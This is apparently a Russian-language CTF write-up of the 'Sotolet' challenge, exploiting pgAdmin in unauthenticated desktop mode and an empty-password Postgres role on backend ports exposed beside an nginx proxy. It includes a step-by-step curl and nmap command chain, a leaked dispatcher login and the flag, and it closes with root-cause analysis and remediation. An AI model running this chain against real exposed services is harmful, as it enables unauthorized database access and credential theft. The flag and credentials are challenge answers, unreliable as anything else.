# Сотолёт — технический разбор

**Флаг:** `avito{5ot0lE7_que3N_bEar1NG}`
**Класс:** Infrastructure · Web · exposed management services · credential disclosure

## Краткое техническое резюме

Публичный reverse proxy ограничивает доступ к двум административным virtual hosts, однако backend-
сервисы также привязаны к публичному интерфейсу на портах `8080` и `8443`. Прямой доступ к pgAdmin в
desktop mode не требует аутентификации. В pgAdmin уже зарегистрировано соединение с PostgreSQL под
ролью `bee`, принимающей пустой пароль. SQL-доступ раскрывает учётные данные старшего диспетчера;
аутентификация с ними в напрямую доступной панели на `8443` возвращает незамаскированный маршрут с
флагом. Корневая причина — нарушение сетевой сегментации и ошибочное предположение, что ACL на nginx
защищает backend-порты, доступные в обход reverse proxy.

---

**Для воспроизведения:** Нужен текущий адрес экземпляра с доступными backend-портами pgAdmin и панели диспетчера. Приведённый IP фиксирует наблюдение во время CTF, а не гарантирует доступность сервиса сейчас.

## 1. Контекст и цель

Публичный интерфейс отображает карту полётов и сообщает: `Режим: PUBLIC — закрытые маршруты не
выводятся`. Цель — получить доступ к панели старшего диспетчера и извлечь скрытый объект
`queen-route` («Маршрут Королевы»).

## 2. Разведка и поверхность атаки

Главная страница `sotolet.ru` ссылается на два соседних поддомена. Команда `dig` показывает, что все
три имени resolve в **один публичный IP `84.201.131.80`**. Следовательно, изоляцию административных
сервисов необходимо проверять не только на уровне virtual hosts, но и на уровне network listeners:

| Host | Назначение | Доступ через nginx на `:443` |
|---|---|---|
| `sotolet.ru` | публичный радар полётов (сайт + карта в браузере) | `200` (открыт) |
| `sotobaza.sotolet.ru` | интерфейс **pgAdmin 4** для базы Postgres | **`403`** (nginx `deny all`) |
| `sotokabina.sotolet.ru` | панель **старшего диспетчера** | **`403`** (nginx `deny all`) |

Оба административных virtual hosts возвращают `403` для любого запрошенного пути.

Клиентский код карты (`/static/js/tactical-map.js`) запрашивает `GET /api/map-data`, после чего
отфильтровывает записи с признаком `hidden`:

```js
visibleRoutes = routes.filter(r => !r.hidden);
```

Это требует проверки на IDOR или избыточную выдачу данных. Прямой ответ `GET /api/map-data` показывает,
что сервер маскирует чувствительные поля до сериализации ответа:

```json
{ "id":"queen-route", "path":"XXX XXX ...", "distance":"закрыто", "status":"секретный", "hidden":true }
```

Таким образом, прямой запрос к `/api/map-data` не обходит серверную авторизацию и маскирование.

## 3. Анализ и проверка гипотез

- **Наблюдение.** Два «закрытых» поддомена ведут на тот же IP, что и публичный портал, и отдают `403` от
  nginx на каждом пути.

- **Гипотеза №1: клиентское маскирование.** Поле `hidden` позволяет предположить, что фильтрация
  выполняется только во frontend и прямой запрос вернёт исходные данные.
  **Проверка:** прямой `curl GET /api/map-data` — поля `path`, `distance`, `status` для `queen-route`
  уже заменены заглушками на сервере. Гипотеза отвергнута.

- **Гипотеза №2: обход ACL заголовками.** Ответ `403` мог быть результатом IP allowlist или проверки
  `Host`/SNI. **Проверка:** requests с изменёнными `Host`, SNI, `X-Forwarded-For` и `X-Real-IP` на оба
  административных поддомена возвращают тот же ответ. Применяется
  безусловный `deny all;` на уровне virtual host, а не allowlist клиентских IP.

- **Гипотеза №3: прямой доступ к backend listener'ам.** ACL nginx действует только на трафик через
  `:443`; отдельные application listeners на том же публичном интерфейсе могут быть доступны напрямую.
  **Проверка:** port scan `84.201.131.80` через `nmap` выявляет открытые `:8080` и `:8443`.
  Последующий HTTP fingerprinting определяет `:8080` как pgAdmin 4 (`Server: gunicorn`, redirect на
  `/browser/`, cookie `pga4_session`), а `:8443` — как панель диспетчера (`Server: gunicorn`, redirect
  на `/login`, заголовок «Вход в Сотокабину»). Оба сервиса доступны без ACL и TLS.

- **Анализ pgAdmin.** Доступный без аутентификации ресурс `/browser/js/utils.js` содержит
  `pgAdmin['server_mode'] = 'False'`: экземпляр запущен в desktop mode, поэтому отдельного login flow
  нет. CSRF token и session cookie из pre-auth ответа достаточно для обращения к API pgAdmin.

- **Гипотеза о доступе к базе.** В pgAdmin зарегистрирован server `Sotobaza` (`host: db`, `user: bee`,
  `is_password_saved: false`). Роль `bee` может принимать пустой пароль из-за конфигурации PostgreSQL
  внутри container network. `POST /browser/server/connect/1/1` с `{"password":""}` возвращает
  `"Server connected."`, после чего Query Tool выполняет SQL-запросы.

- **Проверка прямого извлечения флага из БД.** Запрос `SELECT * FROM tactical_routes WHERE
  id='queen-route';` возвращает строку, замаскированную **на уровне таблицы** (`"XXX XXX..."`,
  `"закрыто"`). Unmasking реализован в приложении диспетчера, а не в БД. Роль `chief` в PostgreSQL
  имеет superuser privileges, но не принимает пустой пароль, поэтому
  этот путь не обеспечивает доступ к незамаскированному значению.

- **Получение прикладной сессии.** База раскрывает учётные данные приложения (таблица `dispatchers`:
  `starshina_sot` /
  `SMENA-STARSHINA-7741`, роль `chief` = старший диспетчер). Аутентификация этими credentials напрямую
  на `:8443` возвращает `302` и session cookie; `GET /api/admin-data` выдаёт незамаскированный
  `queen-route` с флагом.

## 4. Корневая причина

Правило `nginx deny all;` применяется только к трафику через reverse proxy. pgAdmin 4 на `:8080` и
Flask-панель диспетчера на `:8443` привязаны к публичному IP `84.201.131.80` и доступны в обход nginx:

1. **Нарушение сетевой сегментации.** pgAdmin 4 работает в **desktop / no-auth mode**
   (`server_mode = False`) и доступен
   без пароля прямо на origin-IP. В сочетании с ролью Postgres `bee`, принимающей **пустой пароль**, это
   даёт полный SQL-доступ к базе `sotobaza`, включая таблицу `dispatchers` с application credentials в
   открытом виде.

2. **Публичный backend административного приложения.** Панель Сотокабины доступна напрямую на `:8443`
   по HTTP, в обход nginx ACL
   на `sotokabina.sotolet.ru:443`, поэтому раскрытые credentials `starshina_sot` принимаются обычным
   login flow.

3. **Клиентская фильтрация не является уязвимым звеном.** Сервер корректно маскирует чувствительные
   поля в `/api/map-data`; цепочка эксплуатации основана на инфраструктурной экспозиции сервисов.

## 5. Эксплуатация

```bash
# 0. Сканирование origin IP: поиск backend-портов в обход nginx ACL
nmap -p- 84.201.131.80   # среди прочего: 8080/tcp open, 8443/tcp open

# 1. pgAdmin в desktop-режиме — CSRF-токен без аутентификации
curl -s -c cj http://84.201.131.80:8080/browser/js/utils.js | grep -E 'server_mode|csrf_token'
# pgAdmin['server_mode'] = 'False';  <- desktop mode, login flow отсутствует

# 2. Подключение к зарегистрированному серверу под bee с пустым паролем
curl -s -X POST http://84.201.131.80:8080/browser/server/connect/1/1 \
  -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
  -c cj -b cj -d '{"password":""}'          # -> "Server connected."

# 3. Инициализация Query Tool session (`dbname` обязателен в request body)
curl -s -X POST http://84.201.131.80:8080/sqleditor/initialize/sqleditor/1/1/1/16384 \
  -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
  -c cj -b cj -d '{"dbname":"sotobaza"}'

# 4. Извлечение учётных данных приложения
curl -s -X POST http://84.201.131.80:8080/sqleditor/query_tool/start/1 \
  -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
  -c cj -b cj -d '{"sql":"SELECT * FROM dispatchers;"}'
curl -s http://84.201.131.80:8080/sqleditor/poll/1 -H "X-pgA-CSRFToken: <token>" -c cj -b cj
# -> starshina_sot / SMENA-STARSHINA-7741 (role: chief, старший диспетчер)

# 5. Аутентификация в панели диспетчера через публичный backend-порт
curl -s -c kcj -X POST http://84.201.131.80:8443/login \
  --data-urlencode "login=starshina_sot" --data-urlencode "password=SMENA-STARSHINA-7741"
# -> 302 Found, Set-Cookie: session=... ({"callsign":"starshina_sot"})

# 6. Получение незамаскированной карты; флаг находится в queen-route
curl -s -b kcj http://84.201.131.80:8443/api/admin-data
```

Всю цепочку воспроизводит `solve_sotolet.py`:

```bash
uv run python sotolet/solve_sotolet.py
```

## 6. Флаг

```
avito{5ot0lE7_que3N_bEar1NG}
```

## 7. Выводы и рекомендации

1. **Reverse-proxy ACL не заменяет сетевую сегментацию.** Backend-сервисы следует привязывать к
   loopback-интерфейсу или private network и ограничивать security group/firewall правилами. Проверка
   external attack surface должна включать полный port scan origin IP.

2. **pgAdmin в desktop-режиме = отсутствие аутентификации.** Его пре-авторизационный JS (`utils.js`) сам
   выдаёт `server_mode` и CSRF token. Зарегистрированное соединение и пустой пароль обеспечивают полный
   SQL-доступ. Административные интерфейсы БД не должны находиться в публичной сети; database roles
   должны использовать обязательную аутентификацию и минимально необходимые privileges.

3. **Необходимо разделять application и infrastructure review.** Отсутствие IDOR в публичном API не
   исключает прямую экспозицию внутренних management services.

## 8. Файлы для воспроизведения

В репозитории:

- `solve_sotolet.py` — end-to-end solver для заданных origin IP и backend ports:
  pgAdmin session → SQL query → dispatcher login → flag.
